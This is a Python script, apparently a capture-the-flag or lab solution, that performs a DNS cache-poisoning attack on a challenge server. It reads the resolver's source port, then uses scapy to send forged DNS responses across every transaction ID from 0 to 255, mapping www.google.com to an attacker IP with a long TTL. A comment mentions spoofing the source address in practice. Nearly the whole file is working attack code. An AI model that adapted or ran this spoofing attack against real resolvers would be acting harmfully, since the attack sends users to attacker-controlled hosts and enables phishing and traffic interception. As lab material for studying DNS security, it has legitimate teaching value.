#!/usr/bin/env python3
from pwn import connect
from scapy.all import IP, UDP, Raw, send
import re
import time
from concurrent.futures import ThreadPoolExecutor
from typing import Optional
from utils import build_response_packet, RecordType, ResponseCode

# Configuration
TARGET_DOMAIN = "www.google.com"
ATTACKER_IP = "11.4.5.14"
TTL = 86400

YOUR_REAL_IP = '172.24.0.10' # TODO: fill in your actual ip here
SPOOFED_IP = '140.112.30.191'
SPOOFED_PORT = 53053
SERVER_IP = '140.112.91.4' # nasaws4.csie.ntu.edu.tw

MAX_TRANSACTION_ID = 255

def extract_port(output):
    # Extract the source port from the server's output
    match = re.search(r"source port (\d+)", output)
    if match:
        return int(match.group(1))
    else:
        raise ValueError("Could not extract source port from server output.")

def send_dns_response(
    src_ip: str,    dst_ip: str,
    src_port: int,  dst_port: int,
    transaction_id: int,
    domain: str,
    qtype: RecordType,
    answer: str,
    ttl: int,
    auth_ip: Optional[str] = None
):
    response_packet = build_response_packet(
        tid=transaction_id,
        domain=domain,
        qtype=qtype,
        rcode=ResponseCode.NOERROR,
        answer=answer,
        ttl=ttl,
        auth_ip=auth_ip
    )

    ip_layer = IP(src=src_ip, dst=dst_ip)
    udp_layer = UDP(sport=src_port, dport=dst_port)
    raw_layer = Raw(load=response_packet)

    packet = ip_layer / udp_layer / raw_layer
    send(packet, verbose=0)

def main():
    server = connect(SERVER_IP, 48765)

    # send query
    server.recvuntil(b'Provide a query')
    server.sendline(b"www.google.com A")

    # extract source port
    output = server.recvline_contains(b'source port').decode()
    server_port = extract_port(output)
    print(f"Extracted source port: {server_port}")

    start: float = time.time()
    transaction_ids = range(0, MAX_TRANSACTION_ID + 1)
    max_workers = len(transaction_ids)
    with ThreadPoolExecutor(max_workers=max_workers) as pool:
        pool.map(
            lambda transaction_id: send_dns_response(
                src_ip=YOUR_REAL_IP, # in practice, SPOOFED_IP should be used instead
                src_port=SPOOFED_PORT,
                dst_ip=SERVER_IP,
                dst_port=server_port,
                transaction_id=transaction_id,
                domain=TARGET_DOMAIN,
                qtype=RecordType.A,
                answer=ATTACKER_IP,
                ttl=TTL
            ),
            transaction_ids
        )

    print('complete in time:', time.time()-start)
    # server.interactive() # proceed to retrieve the flag from 140.112.30.185 in interactive mode

    # receive the server's response
    flag = server.recvline_contains(b'Flag', timeout=0.2).decode().split(' ')[-1]
    if flag:
        print("flag:", flag)
    else:
        print('attack failed')
    server.close()


if __name__ == "__main__":
    main()
